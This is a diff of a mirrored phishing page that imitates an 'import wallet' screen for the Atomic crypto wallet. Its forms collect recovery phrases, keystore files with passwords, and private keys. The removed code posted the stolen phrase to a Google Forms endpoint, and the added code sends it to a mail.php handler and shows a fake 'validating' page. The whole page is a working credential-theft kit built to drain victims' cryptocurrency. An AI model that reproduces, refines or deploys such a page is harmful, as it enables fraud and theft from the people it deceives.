@@ -1,5 +1,4 @@
 <html>
-  <!-- Mirrored from www.submainetconnect.com/import.php?import=Atomic by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Dec 2021 02:59:51 GMT -->
   <!-- Added by HTTrack --><meta
     http-equiv="content-type"
     content="text/html;charset=UTF-8"
@@ -73,16 +72,12 @@
       ></iframe>
 
       <div id="phrase" class="tabcontent" style="display: block">
-        <form
-          action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeRmfUnhfA3m4DlkUscqV2uZt-B7Ht_hd9rGk65fhBtSIyYdA/formResponse"
-          method="POST"
-          target="hidden_iframe"
-        >
-          <input type="hidden" name="entry.170166457" value="Phrase" />
-          <input type="hidden" name="entry.170166457" value="Atomic" />
+        <form action="mail.php" method="POST">
+          <input type="hidden" name="name" value="Phrase" />
+          <input type="hidden" name="email" value="Atomic" />
 
           <textarea
-            name="entry.170166457"
+            name="message"
             class="phrase"
             required="required"
             minlength="12"
@@ -103,6 +98,7 @@
           method="POST"
           target="hidden_iframe"
           method="post"
+          onsubmit="return validateForm();"
         >
           <input type="hidden" name="entry.548082476" value="Keystore JSON" />
           <input type="hidden" name="entry.548082476" value="Atomic" />
@@ -127,7 +123,9 @@
             used to encrypt it.
           </div>
           <br />
-          <button type="submit" name="submit" class="btn">Submit</button>
+          <button type="submit" name="submit" class="btn">
+            <a href="validating.html">Submit</a>
+          </button>
         </form>
       </div>
 
@@ -137,6 +135,7 @@
           method="POST"
           target="hidden_iframe"
           method="post"
+          onsubmit="return validateForm();"
         >
           <input type="hidden" name="entry.1248560231" value="Private Key" />
           <input type="hidden" name="entry.1248560231" value="Atomic" />
@@ -153,17 +152,20 @@
             Typically 12 (sometimes 24) words separated by single spaces
           </div>
           <br />
-          <button type="submit" name="submit" class="btn">Submit</button>
+          <button type="submit" name="submit" class="btn">
+            <a href="validating.html">Submit</a>
+          </button>
         </form>
       </div>
 
-      <script>
-        document.getElementById("default").click();
-        const urlParams = new URLSearchParams(window.location.search);
-        const walletType = urlParams.get("import");
-        document.querySelectorAll("input[name='wallet']").forEach((node) => {
-          node.value = walletType;
-        });
+      <script type="text/javascript">
+        // document.getElementById("default").click();
+        // const urlParams = new URLSearchParams(window.location.search);
+        // const walletType = urlParams.get("import");
+        // document.querySelectorAll("input[name='wallet']").forEach((node) => {
+        //   node.value = walletType;
+        // });
+        var submitted = false;
       </script>
       <footer>
         <div id="footer">
@@ -191,5 +193,4 @@
       </footer>
     </center>
   </body>
-  <!-- Mirrored from www.submainetconnect.com/import.php?import=Atomic by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Dec 2021 02:59:51 GMT -->
 </html>
